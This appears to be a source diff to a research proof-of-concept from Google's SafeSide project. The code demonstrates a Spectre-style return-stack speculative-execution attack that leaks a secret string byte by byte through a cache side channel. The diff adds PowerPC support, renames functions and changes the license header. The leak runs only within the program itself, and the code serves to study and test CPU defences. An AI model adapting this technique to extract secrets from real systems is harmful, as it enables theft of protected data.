@@ -1,17 +1,10 @@
 /*
  * Copyright 2019 Google LLC
  *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
+ * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
+ * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
  *
- *   https://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
+ * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
  */
 
 #include <array>
@@ -20,13 +13,8 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
-
-// TODO(asteinha) Implement support for MSVC and Windows.
-// TODO(asteinha) Investigate the exploitability of PowerPC.
-
-// Private data that is accessed only speculatively. The architectural access
-// to it is unreachable in the control flow.
-const char *private_data = "It's a s3kr3t!!!";
+#include "local_content.h"
+#include "utils.h"
 
 // Global variable stores for avoiding to pass data through function arguments.
 size_t current_offset;
@@ -35,20 +23,20 @@ const std::array<BigByte, 256> *oracle_ptr;
 #if SAFESIDE_ARM64
 // On ARM we need a local function to return to because of local vs. global
 // relocation mismatches.
-void return_handler() {
+void ReturnHandler() {
   JumpToAfterSpeculation();
 }
 #endif
 
 // Call a "UnwindStackAndSlowlyReturnTo" function which unwinds the stack
-// jumping back to the "afterspeculation" label in the "leak_byte" function
+// jumping back to the "afterspeculation" label in the "LeakByte" function
 // never executing the code that follows.
 SAFESIDE_NEVER_INLINE
-static void speculation() {
-#if SAFESIDE_X64 || SAFESIDE_IA32
+static void Speculation() {
+#if SAFESIDE_X64 || SAFESIDE_IA32 || SAFESIDE_PPC
   const void *return_address = afterspeculation;
 #elif SAFESIDE_ARM64
-  const void *return_address = reinterpret_cast<const void *>(return_handler);
+  const void *return_address = reinterpret_cast<const void *>(ReturnHandler);
 #else
 #  error Unsupported CPU.
 #endif
@@ -57,8 +45,8 @@ static void speculation() {
 
   // Everything that follows this is architecturally dead code. Never reached.
   // However, the first two statements are executed speculatively.
-  const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;
-  ForceRead(isolated_oracle.data() + static_cast<size_t>(
+  const std::array<BigByte, 256> &oracle = *oracle_ptr;
+  ForceRead(oracle.data() + static_cast<size_t>(
       private_data[current_offset]));
 
   std::cout << "If this is printed, it signifies a fatal error. "
@@ -71,29 +59,30 @@ static void speculation() {
   }
 }
 
-static char leak_byte() {
+static char LeakByte() {
   CacheSideChannel sidechannel;
   oracle_ptr = &sidechannel.GetOracle(); // Save the pointer to global storage.
 
   for (int run = 0;; ++run) {
     sidechannel.FlushOracle();
 
-#if SAFESIDE_ARM64
-    // On ARM we have to manually backup registers that are callee-saved,
-    // because the "speculation" method will never restore their backups.
+#if SAFESIDE_ARM64 || SAFESIDE_PPC
+    // On ARM and PowerPC we have to manually backup registers that are
+    // callee-saved, because the "speculation" method will never restore their
+    // backups.
     BackupCalleeSavedRegsAndReturnAddress();
 #endif
 
     // Yields two "call" instructions, one "ret" instruction, speculatively
     // accesses the oracle and ends up on the afterspeculation label below.
-    speculation();
+    Speculation();
 
     // Return target for the UnwindStackAndSlowlyReturnTo function.
     asm volatile(
         "_afterspeculation:\n" // For MacOS.
         "afterspeculation:\n"); // For Linux.
 
-#if SAFESIDE_ARM64
+#if SAFESIDE_ARM64 || SAFESIDE_PPC
     RestoreCalleeSavedRegs();
 #endif
 
@@ -116,7 +105,7 @@ int main() {
   std::cout.flush();
   for (size_t i = 0; i < strlen(private_data); ++i) {
     current_offset = i; // Saving the index to the global storage.
-    std::cout << leak_byte();
+    std::cout << LeakByte();
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
